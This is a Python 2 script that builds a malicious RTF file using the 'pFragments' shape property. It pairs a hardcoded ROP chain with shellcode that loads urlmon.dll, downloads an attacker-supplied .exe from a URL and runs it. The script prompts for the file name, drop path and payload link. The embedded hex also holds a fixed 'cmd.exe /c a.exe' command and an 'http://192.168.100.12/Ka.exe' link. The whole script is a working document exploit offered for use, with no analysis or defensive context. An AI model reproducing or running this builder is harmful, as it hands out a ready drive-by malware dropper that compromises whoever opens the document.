
import binascii


file_h1 = "{\\rtt{\shp{\sp{ \sn pFragments}{\sv 5;7;ffffffffd2030000000000000000000000000000000000000000"

file_dummy = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

start = "5e16807c"  #1 retn

rop = "0cb8877c" #2 pop ebx retn
rop += "d41a807c" #
rop += "58bb807c" #3 pop esi pop ebx pop ebp retn8
rop += "d41a807c" #esi
rop += "00040000" #ebx
rop += "7b46867c" #ebp 1
rop += "0df3877c" #4 pop edx pop eax pop ebp retn
rop += "aaaaaaaa" #
rop += "aaaaaaaa"
rop += "40000000" #edx
rop += "90909090" #eax
rop += "7b46867c" #ebp
rop += "fe0a817c" #5 pop edi retn
rop += "7e99807c" #edi 3
rop += "02b6997c" #6 pop ecx retn
rop += "50000100" #ecx
rop += "2bd2977c" #7 pushad retn

shellcode = "58558bec52368d555352ff554f83ec3c33c95151368d557352368d95aa000000525133c0058bbc6e7effd0b90500000051368d557352b8ad23867cffd033db53b8faca817cffd05b5dc27b7b1d807c433a5c57494e444f57535c73797374656d33325c75726c6d6f6e2e646c6c00ff"

print " File name? "
print " Example: test.doc "
file_name = raw_input()



print " Where do you want to make file? "
print " Example:  c:\windows\\test.exe "

input_exe = raw_input()

file_exe2=binascii.b2a_hex(input_exe)

while 1:
	if len(file_exe2) < 110:
		file_exe2 += "0"
	else:
		break

print " What is the link to your .exe ? "
print " Example:   http://192.168.0.100/test.exe "

url = raw_input()
print url

file_url3=binascii.b2a_hex(url)

while 1:
	if len(file_url3) < 94:
		file_url3 += "0"
	else:
		break


file_end4 = "ad23867cffd033b85384867cae80817ca49B837cf069837cce80817c010200000df3877c40000000414141414141414124e0807c8d64887c41414141fe0a817c4141414129ae817c7601887c909090902430807c9090909090909090909033c0506863616c636a058d4424045068faca717C8044240210687D23767c800424308044240210C3eb7731c9648b71308b760c8b761c8b5e088b7e208b3666394f1875f2c3608b6c24248b453c8b54057801ea8b4a188b5a2001ebe334498b348b01ee31ff31c0fcac84c07407c1cf0d01c7ebf43b7c242875e18b5a2401eb668b0c4b8b5a1c01eb8b048b01e88944241c61c3e892ffffff5f81ef98ffffffeb05e8edffffff688e4e0eec53e894ffffff31c966b96f6e516875726c6d54ffd068361a2f7050e87affffff31c951518d3781c6eeffffff8d560c525751ffd06898fe8a0e53e85bffffff415156ffd0687ed8e27353e84bffffffffd0636d642e657865202f632020612e65786500687474703a2f2f3139322e3136382e3130302e31322f4b612e657865{}}}}}"


file = file_h1 + start + file_dummy + rop + shellcode +file_exe2 + file_url3 + file_end4

fp = open(file_name,"wb")
fp.write(file)
fp.close()